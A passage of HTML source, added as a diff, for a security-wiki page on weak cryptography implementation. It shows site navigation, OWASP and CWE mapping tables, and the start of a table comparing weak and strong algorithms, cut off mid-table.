@@ -1,0 +1,2411 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Weak Cryptography Implementation # Cryptographic failures occur when sensitive data is inadequately protected, either through broken algorithms, misconfigured implementations, poor key management, or no encryption at all. The attacker doesn&rsquo;t need to break the math; they exploit the gaps around it.
+Notable CWEs: CWE-327 (Broken/Risky Algorithm), CWE-326 (Inadequate Encryption Strength), CWE-331 (Insufficient Entropy), CWE-259 (Hardcoded Password), CWE-347 (Improper Signature Verification).
+OWASP Top 10 Mapping # OWASP Top 10 Category Mapping to Weak Cryptography Example Findings A02:2021 - Cryptographic Failures Primary category for weak cryptographic design and implementation issues Weak password hashing, weak TLS, AES-ECB, hardcoded keys, missing HSTS, data sent over HTTP A07:2021 - Identification and Authentication Failures Applies when weak cryptography affects authentication/session mechanisms Predictable reset tokens, weak JWT secret, JWT alg: none, weak session IDs, brute-forceable OTPs A05:2021 - Security Misconfiguration Applies when platform or server crypto configuration is insecure TLS 1.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Weak Cryptography Implementation" />
+<meta property="og:description" content="Weak Cryptography Implementation # Cryptographic failures occur when sensitive data is inadequately protected, either through broken algorithms, misconfigured implementations, poor key management, or no encryption at all. The attacker doesn&rsquo;t need to break the math; they exploit the gaps around it.
+Notable CWEs: CWE-327 (Broken/Risky Algorithm), CWE-326 (Inadequate Encryption Strength), CWE-331 (Insufficient Entropy), CWE-259 (Hardcoded Password), CWE-347 (Improper Signature Verification).
+OWASP Top 10 Mapping # OWASP Top 10 Category Mapping to Weak Cryptography Example Findings A02:2021 - Cryptographic Failures Primary category for weak cryptographic design and implementation issues Weak password hashing, weak TLS, AES-ECB, hardcoded keys, missing HSTS, data sent over HTTP A07:2021 - Identification and Authentication Failures Applies when weak cryptography affects authentication/session mechanisms Predictable reset tokens, weak JWT secret, JWT alg: none, weak session IDs, brute-forceable OTPs A05:2021 - Security Misconfiguration Applies when platform or server crypto configuration is insecure TLS 1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>Weak Cryptography Implementation | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class=" active">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Weak Cryptography Implementation</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#weak-cryptography-implementation">Weak Cryptography Implementation</a>
+      <ul>
+        <li><a href="#owasp-top-10-mapping">OWASP Top 10 Mapping</a>
+          <ul>
+            <li><a href="#cwe-mapping-addition">CWE Mapping Addition</a></li>
+          </ul>
+        </li>
+        <li><a href="#understanding-the-basics">Understanding the Basics</a>
+          <ul>
+            <li><a href="#weak-vs-strong---quick-reference">Weak vs. Strong - Quick Reference</a></li>
+            <li><a href="#why-it-matters">Why It Matters</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#weak-randomness--insufficient-entropy">Weak Randomness / Insufficient Entropy</a>
+          <ul>
+            <li><a href="#owasp-mapping">OWASP Mapping</a></li>
+            <li><a href="#related-cwes">Related CWEs</a></li>
+            <li><a href="#common-weak-randomness-issues">Common Weak Randomness Issues</a></li>
+            <li><a href="#vulnerable-examples">Vulnerable Examples</a></li>
+            <li><a href="#secure-examples">Secure Examples</a></li>
+            <li><a href="#testing-for-weak-randomness">Testing for Weak Randomness</a></li>
+            <li><a href="#example-token-pattern-issues">Example Token Pattern Issues</a></li>
+            <li><a href="#impact">Impact</a></li>
+            <li><a href="#mitigation">Mitigation</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploiting-weak-cryptography">Exploiting Weak Cryptography</a>
+          <ul>
+            <li><a href="#1-cracking-weak-password-hashes">1. Cracking Weak Password Hashes</a></li>
+            <li><a href="#2-jwt--alg-none-bypass">2. JWT — <code>alg: none</code> Bypass</a></li>
+            <li><a href="#3-jwt--weak-secret-brute-force">3. JWT — Weak Secret Brute Force</a></li>
+            <li><a href="#4-jwt--algorithm-confusion-rs256--hs256">4. JWT — Algorithm Confusion (RS256 → HS256)</a></li>
+            <li><a href="#5-tls--weak-protocol--cipher-detection">5. TLS — Weak Protocol / Cipher Detection</a></li>
+            <li><a href="#6-aes-ecb-mode--pattern-detection">6. AES-ECB Mode — Pattern Detection</a></li>
+            <li><a href="#7-hardcoded-keys--secrets-in-source">7. Hardcoded Keys / Secrets in Source</a></li>
+            <li><a href="#8-http-instead-of-https--missing-hsts">8. HTTP Instead of HTTPS / Missing HSTS</a></li>
+            <li><a href="#test-cases">Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)</a>
+          <ul>
+            <li><a href="#manual-detection">Manual Detection</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact-1">Impact</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#software-integrity---sri-presence-validation">Software Integrity - SRI Presence Validation</a>
+          <ul>
+            <li><a href="#check-all-scripts-and-their-sri-status">Check All Scripts and Their SRI Status</a></li>
+            <li><a href="#list-only-scripts-missing-sri">List Only Scripts Missing SRI</a></li>
+            <li><a href="#list-only-external-scripts-missing-sri">List Only External Scripts Missing SRI</a></li>
+            <li><a href="#check-stylesheets-missing-sri">Check Stylesheets Missing SRI</a></li>
+            <li><a href="#check-external-stylesheets-missing-sri">Check External Stylesheets Missing SRI</a></li>
+            <li><a href="#full-sri-audit-for-scripts-and-stylesheets">Full SRI Audit for Scripts and Stylesheets</a></li>
+            <li><a href="#show-only-external-resources-missing-sri">Show Only External Resources Missing SRI</a></li>
+            <li><a href="#sri-script-validation-status">SRI Script Validation Status</a></li>
+            <li><a href="#important-notes">Important Notes</a></li>
+            <li><a href="#example-secure-script-tag">Example Secure Script Tag</a></li>
+            <li><a href="#example-secure-stylesheet-tag">Example Secure Stylesheet Tag</a></li>
+            <li><a href="#sri-test-cases">SRI Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#notable-incidents">Notable Incidents</a></li>
+            <li><a href="#hackerone-reports">HackerOne Reports</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="weak-cryptography-implementation">
+  Weak Cryptography Implementation
+  <a class="anchor" href="#weak-cryptography-implementation">#</a>
+</h1>
+<p>Cryptographic failures occur when sensitive data is inadequately protected, either through broken algorithms, misconfigured implementations, poor key management, or no encryption at all. The attacker doesn&rsquo;t need to break the math; they exploit the gaps around it.</p>
+<p>Notable CWEs: CWE-327 (Broken/Risky Algorithm), CWE-326 (Inadequate Encryption Strength), CWE-331 (Insufficient Entropy), CWE-259 (Hardcoded Password), CWE-347 (Improper Signature Verification).</p>
+<h2 id="owasp-top-10-mapping">
+  OWASP Top 10 Mapping
+  <a class="anchor" href="#owasp-top-10-mapping">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>OWASP Top 10 Category</th>
+<th>Mapping to Weak Cryptography</th>
+<th>Example Findings</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>A02:2021 - Cryptographic Failures</strong></td>
+<td>Primary category for weak cryptographic design and implementation issues</td>
+<td>Weak password hashing, weak TLS, AES-ECB, hardcoded keys, missing HSTS, data sent over HTTP</td>
+</tr>
+<tr>
+<td><strong>A07:2021 - Identification and Authentication Failures</strong></td>
+<td>Applies when weak cryptography affects authentication/session mechanisms</td>
+<td>Predictable reset tokens, weak JWT secret, JWT <code>alg: none</code>, weak session IDs, brute-forceable OTPs</td>
+</tr>
+<tr>
+<td><strong>A05:2021 - Security Misconfiguration</strong></td>
+<td>Applies when platform or server crypto configuration is insecure</td>
+<td>TLS 1.0/1.1 enabled, weak ciphers, invalid certificate validation, missing secure transport headers</td>
+</tr>
+<tr>
+<td><strong>A08:2021 - Software and Data Integrity Failures</strong></td>
+<td>Applies when integrity validation, signatures, or trust verification are missing or broken</td>
+<td>Improper signature verification, unsigned tokens accepted, unverified signed payloads, weak update/package integrity checks</td>
+</tr>
+</tbody>
+</table>
+<h3 id="cwe-mapping-addition">
+  CWE Mapping Addition
+  <a class="anchor" href="#cwe-mapping-addition">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>CWE</th>
+<th>Description</th>
+<th>Where It Appears</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CWE-330</strong></td>
+<td>Use of Insufficiently Random Values</td>
+<td>Predictable reset tokens, weak OTPs, weak session IDs</td>
+</tr>
+<tr>
+<td><strong>CWE-338</strong></td>
+<td>Use of Cryptographically Weak Pseudo-Random Number Generator</td>
+<td>Use of <code>Math.random()</code>, <code>rand()</code>, timestamp-based token generation</td>
+</tr>
+<tr>
+<td><strong>CWE-335</strong></td>
+<td>Incorrect Usage of Seeds in Pseudo-Random Number Generator</td>
+<td>Predictable seed values based on time, user ID, username, or email</td>
+</tr>
+</tbody>
+</table>
+<h2 id="understanding-the-basics">
+  Understanding the Basics
+  <a class="anchor" href="#understanding-the-basics">#</a>
+</h2>
+<h3 id="weak-vs-strong---quick-reference">
+  Weak vs. Strong - Quick Reference
+  <a class="anchor" href="#weak-vs-strong---quick-reference">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Broken / Avoid</th>
+<th>Use Instead</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hashing (passwords)</td>
+<td>MD5, SHA-1, unsalted SHA-256</td>
+<td>bcrypt, Argon2, scrypt, PBKDF2</td>
+</tr>
+<tr>
+<td>Hashing (integrity)</td>
+<td>MD5, SHA-1</td>
+<td>SHA-256, SHA-3</td>
+</tr>
+<tr>
+<td>Symmetric encryption</td>
